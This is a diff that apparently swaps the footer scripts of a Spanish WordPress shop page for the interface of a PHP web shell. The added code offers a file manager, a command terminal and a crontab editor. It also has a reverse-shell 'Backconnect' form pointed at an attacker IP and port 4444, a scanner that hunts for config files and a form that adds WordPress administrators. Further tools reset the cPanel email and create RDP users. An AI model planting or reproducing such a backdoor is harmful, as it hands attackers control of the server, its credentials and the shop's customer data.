+                    <i class="fas fa-hdd"></i> Root Directory
+                </a>
+                <a href="?dir=/etc" class="sidebar-btn">
+                    <i class="fas fa-cogs"></i> /etc
+                </a>
+                <a href="?dir=/tmp" class="sidebar-btn">
+                    <i class="fas fa-temp"></i> /tmp
+                </a>
+                <a href="?dir=/var/www" class="sidebar-btn">
+                    <i class="fas fa-globe"></i> /var/www
+                </a>
+            </div>
+        </div>
+        
+        <div class="sidebar-section">
+            <h4><i class="fas fa-tools"></i> Advanced Tools</h4>
+            <div class="sidebar-buttons">
+                <button onclick="showWpUser()" class="sidebar-btn">
+                    <i class="fas fa-user-plus"></i> Add WP User
+                </button>
+                <button onclick="showPortScanner()" class="sidebar-btn">
+                    <i class="fas fa-network-wired"></i> Port Scanner
+                </button>
+                <button onclick="showWebshellScanner()" class="sidebar-btn">
+                    <i class="fas fa-shield-alt"></i> Webshell Scanner
+                </button>
+                <button onclick="showBackconnect()" class="sidebar-btn">
+                    <i class="fas fa-plug"></i> Backconnect
+                </button>
+                <button onclick="showConfigHunter()" class="sidebar-btn">
+                    <i class="fas fa-search"></i> Config Hunter
+                </button>
+                <button onclick="showCpanelReset()" class="sidebar-btn">
+                    <i class="fas fa-sync"></i> Reset cPanel
+                </button>
+                <button onclick="showCrontabManager()" class="sidebar-btn">
+                    <i class="fas fa-clock"></i> Manage Crontab
+                </button>
+                <button onclick="showRdpManager()" class="sidebar-btn">
+                    <i class="fas fa-desktop"></i> RDP Manager
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main">
+
+        <!-- System Info -->
+        <div class="system-info">
+            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
+                <div style="display: flex; flex-wrap: wrap; gap: 20px;">
+                    <div class="info-row">
+                        <span class="info-label"><i class="fas fa-user"></i> <strong>User:</strong></span>
+                        <span class="info-value"><?php echo @get_current_user(); ?></span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label"><i class="fas fa-code"></i> <strong>PHP Version:</strong></span>
+                        <span class="info-value"><?php echo phpversion(); ?></span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label"><i class="fas fa-server"></i> <strong>Server Software:</strong></span>
+                        <span class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'N/A'; ?></span>
+                    </div>
+                </div>
+                <div class="login-info">
+                    <i class="fas fa-user-circle"></i>
+                    <?php echo htmlspecialchars($_SESSION['username']); ?>
+                    <a href="?logout=true" class="logout-btn">
+                        <i class="fas fa-sign-out-alt"></i> Logout
+                    </a>
+                </div>
+            </div>
+            <div class="info-row">
+                <span class="info-label"><i class="fas fa-desktop"></i> <strong>Hostname:</strong></span>
+                <span class="info-value"><?php echo php_uname('n'); ?></span>
+            </div>
+            <div class="info-row">
+                <span class="info-label"><i class="fas fa-microchip"></i> <strong>Kernel Version:</strong></span>
+                <span class="info-value"><?php echo php_uname('v'); ?></span>
+            </div>
+            <div class="info-row">
+                <span class="info-label"><i class="fas fa-network-wired"></i> <strong>Server IP:</strong></span>
+                <span class="info-value"><?php echo $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']) ?? 'N/A'; ?></span>
+            </div>
+        </div>
+
+        <!-- Breadcrumb -->
+        <div class="breadcrumb">
+            <div class="dir-status <?php echo is_writable_dir($current_dir) ? 'dir-writable' : 'dir-readonly'; ?>">
+                <i class="fas <?php echo is_writable_dir($current_dir) ? 'fa-check-circle' : 'fa-exclamation-circle'; ?>"></i>
+                <?php echo is_writable_dir($current_dir) ? 'Writable' : 'Read Only'; ?>
+            </div>
+            <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 5px;">
+                <strong><i class="fas fa-folder"></i> Pwd:</strong> 
+                <?php
+                $path_parts = [];
+                $temp_path = $current_dir;
+                
+                while ($temp_path != '.' && $temp_path != '/') {
+                    $path_parts[] = ['name' => basename($temp_path), 'path' => $temp_path];
+                    $temp_path = dirname($temp_path);
+                }
+                $path_parts[] = ['name' => 'Root', 'path' => '.'];
+                $path_parts = array_reverse($path_parts);
+                
+                foreach ($path_parts as $index => $part) {
+                    if ($index > 0) echo ' <i class="fas fa-chevron-right" style="font-size:10px;"></i> ';
+                    echo '<a href="?dir='.urlencode($part['path']).'" class="dir-link">'.htmlspecialchars($part['name']).'</a>';
+                }
+                ?>
+            </div>
+            <a href="?dir=<?php echo urlencode($home_dir); ?>" class="bayy"><i class="fas fa-home"></i> Home</a>
+            <br><div style="font-size: 12px; color: var(--text-secondary);">
+                <strong>Current:</strong> <?php echo realpath($current_dir); ?>
+            </div>
+        </div>
+
+        <!-- Tab Container -->
+        <div class="tab-container">
+            <div class="tab-buttons">
+                <button class="tab-button active" onclick="switchTab('fileManager')">
+                    <i class="fas fa-folder"></i> File Manager
+                </button>
+                <button class="tab-button" onclick="switchTab('terminal')" id="terminalTabButton">
+                    <i class="fas fa-terminal"></i> Terminal
+                </button>
+                <button class="tab-button" onclick="switchTab('crontab')">
+                    <i class="fas fa-clock"></i> Crontab Manager
+                </button>
+            </div>
+            
+            <!-- File Manager Tab -->
+            <div id="fileManager" class="tab-content active">
+                <!-- Toolbar -->
+                <div class="toolbar">
+                    <button onclick="showUpload()" class="btn btn-success">
+                        <i class="fas fa-upload"></i> Upload File
+                    </button>
+                    <button onclick="showMkdir()" class="btn btn-info">
+                        <i class="fas fa-folder-plus"></i> Create Folder
+                    </button>
+                    <button onclick="showNewFile()" class="btn btn-warning">
+                        <i class="fas fa-file-plus"></i> New File
+                    </button>
+                    <button onclick="showZipFiles()" class="btn btn-primary" id="zipBtn" disabled>
+                        <i class="fas fa-file-archive"></i> Zip Selected (<span id="selectedCount">0</span>)
+                    </button>
+                    <button onclick="showUnzipFile()" class="btn btn-secondary">
+                        <i class="fas fa-expand-arrows-alt"></i> Unzip File
+                    </button>
+                </div>
+
+                <!-- File List -->
+                <div class="section">
+                    <h3 style="margin-bottom: 15px;">
+                        <i class="fas fa-list"></i> Directory Contents
+                    </h3>
+                    
+                    <div class="file-list" id="fileList">
+                        <?php
+                        // Parent directory link
+                        if ($current_dir != '.' && $current_dir != '/') {
+                            $parent = dirname($current_dir);
+                            $parent_writable = is_writable_dir($parent);
+                            echo '<div class="file-item">
+                                <span class="file-name">
+                                    <span class="icon-folder"><i class="fas fa-folder"></i></span> 
+                                    <a href="?dir='.urlencode($parent).'" class="dir-link">
+                                        Parent Directory
+                                        ' . (!$parent_writable ? '<span class="writable-indicator writable-false" title="Read Only"></span>' : '') . '
+                                    </a>
+                                </span>
+                                <div class="file-actions">
+                                    <span class="file-info">DIR</span>
+                                </div>
+                            </div>';
+                        }
+
+                        $files = @scandir($current_dir);
+                        if ($files) {
+                            foreach ($files as $file) {
+                                if ($file == '.' || $file == '..') continue;
+                                
+                                $fullpath = $current_dir . '/' . $file;
+                                $is_dir = @is_dir($fullpath);
+                                $icon = $is_dir ? '<span class="icon-folder"><i class="fas fa-folder"></i></span>' : '<span class="icon-file"><i class="fas fa-file"></i></span>';
+                                $size = $is_dir ? '-' : format_size(@filesize($fullpath));
+                                $perms = substr(sprintf('%o', @fileperms($fullpath)), -4);
+                                $time = @date('Y-m-d H:i:s', @filemtime($fullpath));
+                                $created = @date('Y-m-d H:i:s', @filectime($fullpath));
+                                $is_writable = is_writable($fullpath);
+                                
+                                echo '<div class="file-item" data-file="'.htmlspecialchars($file).'" data-path="'.htmlspecialchars($fullpath).'" data-type="'.($is_dir ? 'dir' : 'file').'">
+                                    <span class="file-name">'.$icon.' ';
+                                
+                                if ($is_dir) {
+                                    $dir_writable = is_writable_dir($fullpath);
+                                    echo '<a href="?dir='.urlencode($fullpath).'" class="dir-link">'.htmlspecialchars($file);
+                                    if (!$dir_writable) {
+                                        echo ' <span class="writable-indicator writable-false" title="Read Only"></span>';
+                                    }
+                                    echo '</a>';
+                                } else {
+                                    echo htmlspecialchars($file);
+                                    if (!$is_writable) {
+                                        echo ' <span class="writable-indicator writable-false" title="Read Only"></span>';
+                                    }
+                                }
+                                                                            
+                                echo '</span>
+                                    <div class="file-details">
+                                        <div class="file-detail-item">
+                                            <i class="fas fa-calendar" style="font-size:9px;"></i>
+                                            <span>Created: ' . $created . '</span>
+                                        </div>
+                                        <div class="file-detail-item">
+                                            <i class="fas fa-edit" style="font-size:9px;"></i>
+                                            <span>Modified: ' . $time . '</span>
+                                        </div>
+                                        <div class="file-detail-item">
+                                            <i class="fas fa-key" style="font-size:9px;"></i>
+                                            <span class="file-permission">' . $perms . '</span>
+                                        </div>
+                                    </div>
+                                    <div class="file-actions">';
+                                    
+                                if (!$is_dir) {
+                                    echo '<a href="?action=download&file='.urlencode($fullpath).'&dir='.urlencode($current_dir).'" class="btn btn-info" title="Download"><i class="fas fa-download"></i> Download</a>
+                                          <button onclick="editFile(\''.addslashes($fullpath).'\')" class="btn btn-warning" title="Edit" ' . (!$is_writable ? 'disabled' : '') . '><i class="fas fa-edit"></i> Edit</button>';
+                                }
+                                
+                                echo '<button onclick="chmodFile(\''.addslashes($fullpath).'\', \''.$perms.'\')" class="btn btn-secondary" title="Change Permissions"><i class="fas fa-key"></i> Permissions</button>
+                                      <button onclick="renameFile(\''.addslashes($fullpath).'\')" class="btn btn-primary" title="Rename" ' . (!$is_writable ? 'disabled' : '') . '><i class="fas fa-i-cursor"></i> Rename</button>
+                                      <button onclick="deleteFile(\''.addslashes($fullpath).'\')" class="btn btn-danger" title="Delete" ' . (!$is_writable ? 'disabled' : '') . '><i class="fas fa-trash"></i> Delete</button>
+                                    </div>
+                                </div>';
+                            }
+                        } else {
+                            echo '<div class="file-item">Cannot read directory contents</div>';
+                        }
+                        
+                        ?>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Terminal Tab -->
+            <div id="terminal" class="tab-content">
+                <div class="section">
+                    <h3 style="margin-bottom: 15px;">
+                        <i class="fas fa-terminal"></i> System Terminal
+                    </h3>
+                    <div class="terminal">
+                        <div class="command-history" id="commandHistory"></div>
+                        <div class="terminal-output" id="terminalOutput">
+                            <div style="color: #7f8c8d;">// Terminal ready. Type commands below.</div>
+                        </div>
+                        <div style="display: flex; gap: 10px; margin-bottom: 10px;">
+                            <input type="text" name="command" class="terminal-input" placeholder="Enter command..." id="terminalInput">
+                            <button type="button" class="btn btn-success" onclick="executeCommand()" id="executeBtn">
+                                <i class="fas fa-play"></i> Execute
+                            </button>
+                        </div>
+                        <div style="display: flex; gap: 5px; flex-wrap: wrap;">
+                            <button type="button" class="btn btn-secondary" onclick="clearTerminal()">
+                                <i class="fas fa-broom"></i> Clear
+                            </button>
+                            <button type="button" class="btn btn-info" onclick="insertCommonCommand('pwd')">pwd</button>
+                            <button type="button" class="btn btn-info" onclick="insertCommonCommand('ls -la')">ls -la</button>
+                            <button type="button" class="btn btn-info" onclick="insertCommonCommand('whoami')">whoami</button>
+                            <button type="button" class="btn btn-info" onclick="insertCommonCommand('id')">id</button>
+                            <button type="button" class="btn btn-info" onclick="insertCommonCommandWithDir('ls -la')">ls -la (current dir)</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Crontab Manager Tab -->
+            <div id="crontab" class="tab-content">
+                <div class="section">
+                    <h3 style="margin-bottom: 15px;">
+                        <i class="fas fa-clock"></i> Crontab Manager
+                    </h3>
+                    <div class="terminal">
+                        <div class="terminal-output" id="crontabOutput" style="height: 50px;">Loading crontab...</div>
+                        <textarea id="crontabContent" style="width:100%; height:200px; margin:10px 0; font-family: 'Roboto Mono', monospace; font-size: 13px;" placeholder="Edit crontab content here..."></textarea>
+                        <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                            <button type="button" class="btn btn-success" onclick="saveCrontab()">
+                                <i class="fas fa-save"></i> Save Crontab
+                            </button>
+                            <button type="button" class="btn btn-info" onclick="loadCrontab()">
+                                <i class="fas fa-sync"></i> Reload
+                            </button>
+                            <button type="button" class="btn btn-warning" onclick="addCrontabExample()">
+                                <i class="fas fa-plus"></i> Add Example
+                            </button>
+                            <button type="button" class="btn btn-secondary" onclick="clearCrontab()">
+                                <i class="fas fa-eraser"></i> Clear
+                            </button>
+                        </div>
                     </div>
                 </div>
             </div>
 
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div> 
+            <!-- WordPress User Tab -->
+            <div id="wpUser" class="tab-content">
+                <div class="section">
+                    <h3 style="margin-bottom: 15px;">Add WordPress User</h3>
+                    <div class="terminal">
+                        <div class="terminal-output" id="wpUserOutput" style="height: 100px;"></div>
+                        <form id="wpUserForm">
+                            <input type="text" name="wp_config_path" placeholder="Path to wp-config.php (e.g., /var/www/html/wp-config.php)" style="margin: 10px 0;">
+                            <input type="text" name="username" placeholder="Username" style="margin: 10px 0;">
+                            <input type="password" name="password" placeholder="Password" style="margin: 10px 0;">
+                            <input type="email" name="email" placeholder="Email" style="margin: 10px 0;">
+                            <select name="role" style="margin: 10px 0;">
+                                <option value="subscriber">Subscriber</option>
+                                <option value="contributor">Contributor</option>
+                                <option value="author">Author</option>
+                                <option value="editor">Editor</option>
+                                <option value="administrator">Administrator</option>
+                            </select>
+                            <div style="display: flex; gap: 10px; margin-top: 20px;">
+                                <button type="button" class="btn btn-success" onclick="addWpUser()">Add User</button>
+                                <button type="button" class="btn btn-info" onclick="findWpConfig()">Find wp-config.php</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
             </div>
 
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
+            <!-- Port Scanner Tab -->
+            <div id="portScanner" class="tab-content">
+                <div class="section">
+                    <h3 style="margin-bottom: 15px;">Port Scanner</h3>
+                    <div class="terminal">
+                        <div class="terminal-output" id="portScannerOutput" style="height: 300px;"></div>
+                        <input type="text" id="scanHost" placeholder="Host (e.g., localhost or IP)" value="localhost" style="margin: 10px 0;">
+                        <input type="text" id="scanPorts" placeholder="Ports (comma separated)" value="21,22,23,25,53,80,110,115,135,139,143,194,443,445,993,995,1433,3306,3389,5432,5900,6379,27017" style="margin: 10px 0;">
+                        <div style="display: flex; gap: 10px;">
+                            <button type="button" class="btn btn-success" onclick="scanPorts()">Scan Ports</button>
+                            <button type="button" class="btn btn-info" onclick="quickScan()">Quick Scan</button>
+                            <button type="button" class="btn btn-secondary" onclick="document.getElementById('portScannerOutput').innerHTML = ''">Clear</button>
+                        </div>
+                    </div>
+                </div>
             </div>
 
+            <!-- Webshell Scanner Tab -->
+            <div id="webshellScanner" class="tab-content">
+                <div class="section">
+                    <h3 style="margin-bottom: 15px;">Webshell Scanner</h3>
+                    <div class="terminal">
+                        <div class="terminal-output" id="webshellScannerOutput" style="height: 50px;"></div>
+                        <input type="text" id="scanPath" placeholder="Path to scan (e.g., /var/www)" value="/var/www" style="margin: 10px 0;">
+                        <div style="display: flex; gap: 10px;">
+                            <button type="button" class="btn btn-danger" onclick="scanWebshells()">Scan for Webshells</button>
+                            <button type="button" class="btn btn-secondary" onclick="document.getElementById('webshellScannerOutput').innerHTML = ''">Clear</button>
+                        </div>
+                        <div id="webshellResults" style="margin-top: 20px;"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Backconnect Tab -->
+            <div id="backconnect" class="tab-content">
+                <div class="section">
+                    <h3 style="margin-bottom: 15px;">Backconnect</h3>
+                    <div class="terminal">
+                        <div class="terminal-output" id="backconnectOutput" style="height: 300px;"></div>
+                        <input type="text" id="backconnectHost" placeholder="Your IP address" style="margin: 10px 0;">
+                        <input type="text" id="backconnectPort" placeholder="Port" value="4444" style="margin: 10px 0;">
+                        <div style="display: flex; gap: 10px;">
+                            <button type="button" class="btn btn-success" onclick="startBackconnect()">Start Backconnect</button>
+                            <button type="button" class="btn btn-info" onclick="showBackconnectHelp()">Help</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Config Hunter Tab -->
+            <div id="configHunter" class="tab-content">
+                <div class="section">
+                    <h3 style="margin-bottom: 15px;">Config File Hunter</h3>
+                    <div class="terminal">
+                        <div class="terminal-output" id="configHunterOutput" style="height: 50px;"></div>
+                        <input type="text" id="configScanPath" placeholder="Path to scan (e.g., /var/www)" value="/var/www" style="margin: 10px 0;">
+                        <div style="display: flex; gap: 10px;">
+                            <button type="button" class="btn btn-info" onclick="scanConfigFiles()">Scan Config Files</button>
+                            <button type="button" class="btn btn-secondary" onclick="document.getElementById('configHunterOutput').innerHTML = ''">Clear</button>
+                        </div>
+                        <div id="configResults" style="margin-top: 20px;"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- cPanel Reset Tab -->
+            <div id="cpanelReset" class="tab-content">
+                <div class="section">
+                    <h3 style="margin-bottom: 15px;">cPanel Reset</h3>
+                    <div class="terminal">
+                        <div class="terminal-output" id="cpanelResetOutput" style="height: 50px;"></div>
+                        <input type="email" id="cpanelEmail" placeholder="New email address for cPanel" style="margin: 10px 0;">
+                        <div style="display: flex; gap: 10px;">
+                            <button type="button" class="btn btn-warning" onclick="resetCpanel()">Reset cPanel Email</button>
+                            <button type="button" class="btn btn-info" onclick="showCpanelHelp()">Help</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- RDP Manager Tab -->
+            <div id="rdpManager" class="tab-content">
+                <div class="section">
+                    <h3 style="margin-bottom: 15px;">RDP Manager (Windows Only)</h3>
+                    <div class="terminal">
+                        <div class="terminal-output" id="rdpManagerOutput" style="height: 100px;"></div>
+                        <div style="margin: 15px 0;">
+                            <h4>Add RDP User</h4>
+                            <input type="text" id="rdpUsername" placeholder="Username" style="margin: 10px 0;">
+                            <input type="password" id="rdpPassword" placeholder="Password" style="margin: 10px 0;">
+                            <div style="display: flex; gap: 10px;">
+                                <button type="button" class="btn btn-success" onclick="addRdpUser()">Add RDP User</button>
+                                <button type="button" class="btn btn-warning" onclick="enableRdp()">Enable RDP</button>
+                            </div>
+                        </div>
+                        <div style="margin: 15px 0;">
+                            <h4>RDP Information</h4>
+                            <div style="background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: 'Roboto Mono', monospace; font-size: 12px;">
+                                <strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']) ?? 'N/A'; ?><br>
+                                <strong>Default Port:</strong> 3389<br>
+                                <strong>Note:</strong> This feature works only on Windows servers
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
-
     </div>
+</div>
 
-</div><script type="speculationrules">
-{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/basel\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
-</script>
-			<a href="#" rel="nofollow" class="scrollToTop basel-tooltip">Scroll To Top</a>
-					<script>
-				const lazyloadRunObserver = () => {
-					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
-					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
-						entries.forEach( ( entry ) => {
-							if ( entry.isIntersecting ) {
-								let lazyloadBackground = entry.target;
-								if( lazyloadBackground ) {
-									lazyloadBackground.classList.add( 'e-lazyloaded' );
-								}
-								lazyloadBackgroundObserver.unobserve( entry.target );
-							}
-						});
-					}, { rootMargin: '200px 0px 200px 0px' } );
-					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
-						lazyloadBackgroundObserver.observe( lazyloadBackground );
-					} );
-				};
-				const events = [
-					'DOMContentLoaded',
-					'elementor/lazyload/observe',
-				];
-				events.forEach( ( event ) => {
-					document.addEventListener( event, lazyloadRunObserver );
-				} );
-			</script>
-				<script type='text/javascript'>
-		(function () {
-			var c = document.body.className;
-			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
-			document.body.className = c;
-		})();
-	</script>
-	<link rel='stylesheet' id='wc-blocks-style-css' href='https://bolsomadrid.com/wp-content/plugins/woocommerce/assets/client/blocks/wc-blocks.css?ver=wc-10.1.1' type='text/css' media='all' />
-<script type="text/javascript" src="https://bolsomadrid.com/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6" id="wp-hooks-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
-<script type="text/javascript" id="wp-i18n-js-after">
-/* <![CDATA[ */
-wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=6.1.1" id="swv-js"></script>
-<script type="text/javascript" id="contact-form-7-js-translations">
-/* <![CDATA[ */
-( function( domain, translations ) {
-	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
-	localeData[""].domain = domain;
-	wp.i18n.setLocaleData( localeData, domain );
-} )( "contact-form-7", {"translation-revision-date":"2025-08-05 09:20:42+0000","generator":"GlotPress\/4.0.1","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n != 1;","lang":"es"},"This contact form is placed in the wrong place.":["Este formulario de contacto est\u00e1 situado en el lugar incorrecto."],"Error:":["Error:"]}},"comment":{"reference":"includes\/js\/index.js"}} );
-/* ]]> */
-</script>
-<script type="text/javascript" id="contact-form-7-js-before">
-/* <![CDATA[ */
-var wpcf7 = {
-    "api": {
-        "root": "https:\/\/bolsomadrid.com\/wp-json\/",
-        "namespace": "contact-form-7\/v1"
-    },
-    "cached": 1
-};
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=6.1.1" id="contact-form-7-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/woocommerce/assets/js/sourcebuster/sourcebuster.min.js?ver=10.1.1" id="sourcebuster-js-js"></script>
-<script type="text/javascript" id="wc-order-attribution-js-extra">
-/* <![CDATA[ */
-var wc_order_attribution = {"params":{"lifetime":1.0e-5,"session":30,"base64":false,"ajaxurl":"https:\/\/bolsomadrid.com\/wp-admin\/admin-ajax.php","prefix":"wc_order_attribution_","allowTracking":true},"fields":{"source_type":"current.typ","referrer":"current_add.rf","utm_campaign":"current.cmp","utm_source":"current.src","utm_medium":"current.mdm","utm_content":"current.cnt","utm_id":"current.id","utm_term":"current.trm","utm_source_platform":"current.plt","utm_creative_format":"current.fmt","utm_marketing_tactic":"current.tct","session_entry":"current_add.ep","session_start_time":"current_add.fd","session_pages":"session.pgs","session_count":"udata.vst","user_agent":"udata.uag"}};
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/woocommerce/assets/js/frontend/order-attribution.min.js?ver=10.1.1" id="wc-order-attribution-js"></script>
-<script type="text/javascript" id="ywdpd_popup-js-extra">
-/* <![CDATA[ */
-var ywdpd_popup_args = {"ajax_url":"https:\/\/bolsomadrid.com\/wp-admin\/admin-ajax.php","actions":{"add_gift_to_cart":"ywdpd_add_gift_to_cart","add_bogo_to_cart":"ywdpd_add_bogo_to_cart","add_special_to_cart":"ywdpd_add_special_to_cart","show_second_step":"ywdpd_show_second_step","check_variable":"ywdpd_check_variable","update_gift_popup":"ywdpd_update_gift_popup","show_popup_on_shop":"ywdpd_show_popup_on_shop"},"nonces":{"add_gift_to_cart":"475b6e4db1","add_bogo_to_cart":"24a52041c1","add_special_to_cart":"410d3bf9d5","show_second_step":"738e87f954","check_variable":"f37c52d4e2","update_gift_popup":"86d4f3b4d7","show_popup_on_shop":"e6be0033b9"},"i18n_qty_field_label":"Qty in cart","rtl":"false"};
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/yith-woocommerce-dynamic-pricing-and-discounts-premium/assets/js/gift-popup.min.js?ver=3.5.0" id="ywdpd_popup-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/yith-woocommerce-dynamic-pricing-and-discounts-premium/assets/js/owl/owl.carousel.min.js?ver=3.5.0" id="ywdpd_owl-js"></script>
-<script type="text/javascript" id="ywdpd_frontend-js-extra">
-/* <![CDATA[ */
-var ywdpd_qty_args = {"show_minimum_price":"no","template":"horizontal","is_change_qty_enabled":"yes","is_default_qty_enabled":"no","column_product_info_class":".single-product .summary","product_price_classes":".price, .wpb_wrapper .price, .elementor-widget-woocommerce-product-price .price","product_qty_classes":" .qty, .elementor-add-to-cart .qty, .w-post-elm .qty","variation_form_class":"form.variations_form.cart","select_minimum_quantity":"","update_prices_in_ajax":"yes","show_variable_table":"yes","ajax_url":"https:\/\/bolsomadrid.com\/wp-admin\/admin-ajax.php","actions":{"update_product_price":"ywdpd_update_product_price"},"nonces":{"update_product_price":"0c2e687b57"}};
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/yith-woocommerce-dynamic-pricing-and-discounts-premium/assets/js/frontend.min.js?ver=3.5.0" id="ywdpd_frontend-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/isotope.pkgd.min.js?ver=5.9.0" id="isotope-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/jquery.magnific-popup.min.js?ver=5.9.0" id="basel-magnific-popup-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/owl.carousel.min.js?ver=5.9.0" id="basel-owl-carousel-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/imagesloaded.pkgd.min.js?ver=5.9.0" id="basel-imagesloaded-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/jquery.pjax.min.js?ver=5.9.0" id="basel-pjax-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/packery-mode.pkgd.min.js?ver=5.9.0" id="basel-packery-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/jquery.autocomplete.min.js?ver=5.9.0" id="basel-autocomplete-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/device.min.js?ver=5.9.0" id="basel-device-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/waypoints.min.js?ver=5.9.0" id="basel-waypoints-js"></script>
-<script type="text/javascript" id="basel-functions-js-extra">
-/* <![CDATA[ */
-var basel_settings = {"photoswipe_close_on_scroll":"1","adding_to_cart":"Processing","added_to_cart":"Product was successfully added to your cart.","continue_shopping":"Continue shopping","view_cart":"View Cart","go_to_checkout":"Checkout","countdown_days":"days","countdown_hours":"hr","countdown_mins":"min","countdown_sec":"sc","loading":"Loading...","close":"Close (Esc)","share_fb":"Share on Facebook","pin_it":"Pin it","tweet":"Share on X","download_image":"Download image","wishlist":"no","cart_url":"https:\/\/bolsomadrid.com\/carrito","ajaxurl":"https:\/\/bolsomadrid.com\/wp-admin\/admin-ajax.php","add_to_cart_action":"widget","categories_toggle":"yes","enable_popup":"no","popup_delay":"2000","popup_event":"time","popup_scroll":"1000","popup_pages":"0","promo_popup_hide_mobile":"yes","product_images_captions":"no","all_results":"View all results","product_gallery":{"images_slider":true,"thumbs_slider":{"enabled":true,"position":"bottom","items":{"desktop":4,"desktop_small":3,"tablet":4,"mobile":3,"vertical_items":3}}},"zoom_enable":"yes","ajax_scroll":"yes","ajax_scroll_class":".main-page-wrapper","ajax_scroll_offset":"100","product_slider_auto_height":"no","product_slider_autoplay":"","ajax_add_to_cart":"1","cookies_version":"1","header_banner_version":"1","header_banner_close_btn":"1","header_banner_enabled":"","promo_version":"1","pjax_timeout":"5000","split_nav_fix":"","shop_filters_close":"no","sticky_desc_scroll":"1","quickview_in_popup_fix":"","one_page_menu_offset":"150","is_multisite":"","current_blog_id":"1","swatches_scroll_top_desktop":"","swatches_scroll_top_mobile":"","lazy_loading_offset":"0","add_to_cart_action_timeout":"no","add_to_cart_action_timeout_number":"3","single_product_variations_price":"no","google_map_style_text":"Custom style","comment_images_upload_size_text":"Some files are too large. Allowed file size is 1 MB.","comment_images_count_text":"You can upload up to 3 images to your review.","comment_images_upload_mimes_text":"You are allowed to upload images only in png, jpeg formats.","comment_images_added_count_text":"Added %s image(s)","comment_images_upload_size":"1048576","comment_images_count":"3","comment_images_upload_mimes":{"jpg|jpeg|jpe":"image\/jpeg","png":"image\/png"},"home_url":"https:\/\/bolsomadrid.com\/","shop_url":"https:\/\/bolsomadrid.com\/tienda","cart_redirect_after_add":"no","product_categories_placeholder":"Selecciona una categor\u00eda","product_categories_no_results":"No matches found","cart_hash_key":"wc_cart_hash_baa731dbeb9fc047183e65e1eed18a36","fragment_name":"wc_fragments_baa731dbeb9fc047183e65e1eed18a36","combined_css":"no","load_more_button_page_url_opt":"yes","ajax_search_delay":"300","frequently_bought":"d405eca02c"};
